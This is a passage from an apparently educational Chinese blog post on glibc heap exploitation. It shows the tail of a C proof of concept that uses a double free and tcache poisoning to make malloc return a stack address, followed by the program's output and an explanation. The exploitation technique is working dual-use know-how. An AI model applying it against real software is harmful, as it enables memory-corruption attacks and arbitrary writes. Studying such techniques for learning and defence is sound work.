</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Now we are able to cause chunk overlapping&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Step 1: fill up tcache list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>7</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Step 2: free the victim chunk so it will be added to unsorted bin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>prev</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*VULNERABILITY*/</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span><span class=c1>// a is already freed
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=cm>/*VULNERABILITY*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// simple tcache poisoning
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Launch tcache poisoning&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x120</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;We simply overwrite victim&#39;s fwd pointer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mh>0x120</span><span class=o>/</span><span class=mi>8</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// take target out
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Now we can cash out the target chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The new chunk is at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// sanity check
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>assert</span><span class=p>(</span><span class=n>c</span><span class=o>==</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Got control on target/stack!</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// note
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Note:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates a powerful tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this demo, the stack).
This attack only relies on double free.

The address we want malloc() to return, namely,
the target address is 0x7ffd2845e850.

Preparing heap layout
Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.
Allocating a chunk for later consolidation
Allocating the victim chunk.
malloc(0x100): a=0xcffae0.
Allocating a padding to prevent consolidation.

Now we are able to cause chunk overlapping
Step 1: fill up tcache list
Step 2: free the victim chunk so it will be added to unsorted bin
Step 3: free the previous chunk and make it consolidate with the victim chunk.
Step 4: add the victim chunk to tcache list by taking one out from it and free victim again

Launch tcache poisoning
Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk
We simply overwrite victim&#39;s fwd pointer
Now we can cash out the target chunk.
The new chunk is at 0x7ffd2845e850
Got control on target/stack!

Note:
And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
In that case, once you have done this exploitation, you can have many arbitary writes very easily.
</code></pre><p>首先用 7 个 0x100 的 chunk 填满 tcache，再次申请 0x100 的 chunk <code>a</code> 并释放就只能进入 unsorted bin。如果它上一个 chunk 同样是 0x100 并且也被释放，那么它们就会合并。</p><p>现在从 tcache 中取出一个 chunk，然后 double free 掉 <code>a</code>，<code>a</code> 就进入了 tcache。然后我们申请一个大于 0x100 的 chunk 使得 tcache 无法满足申请，从而从 unsorted bin 中取出刚才合并好的 chunk，构成堆块重叠，修改 <code>a</code> 的 <code>fd</code> 为栈上地址，<code>malloc</code> 两次即可分配到栈上。</p></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=flex><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt=Mercury src=/my_avatar_huffcabec77dc887387e1e045311cbdc8b_49733_192x192_fill_box_smart1_3.png><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">作者</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Mercury</div><div class="text-sm text-neutral-700 dark:text-neutral-400">A student</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" href=mailto:signormercurio@gmail.com target=_blank aria-label=Email rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/SignorMercurio target=_blank aria-label=Github rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" href=https://t.me/m9r_at_tG target=_blank aria-label=Telegram rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></div></div></div></div><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="group flex" href=/posts/rop-emporium/><span class="mr-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-2 text-neutral-700 transition-transform group-hover:translate-x-[2px] group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">ROP Emporium 练习记录</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-12-09 15:02:43 +0000 UTC">2019-12-09</time></span></span></a></span>
<span><a class="group flex text-right" href=/posts/glibc-heap/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">盘根错节：GLibc 堆内存管理机制简介</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-12-08 16:53:39 +0000 UTC">2019-12-08</time></span></span>
<span class="ml-2 text-neutral-700 transition-transform group-hover:translate-x-[2px] group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer><script src=//unpkg.com/valine/dist/Valine.min.js></script><div id=vcomments class="mt-8 max-w-prose print:hidden"></div><script>new Valine({el:"#vcomments",appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"robohash",requiredFields:["nick"]})</script></article><div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer class="py-10 print:hidden"><nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=https://creativecommons.org/licenses/by-nc/4.0/ title>CC BY-NC 4.0</a></li></ul></nav><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2023
Mercury</p><p class="text-xs text-neutral-500 dark:text-neutral-400">由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://git.io/hugo-congo target=_blank rel="noopener noreferrer">Congo</a> 强力驱动</p></div><div class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"><button id=appearance-switcher type=button><div class="flex items-center justify-center w-12 h-12 dark:hidden" title=切换为深色模式><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden w-12 h-12 dark:flex" title=切换为浅色模式><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div></footer><div id=search-wrapper class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://blog.sigmerc.top><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>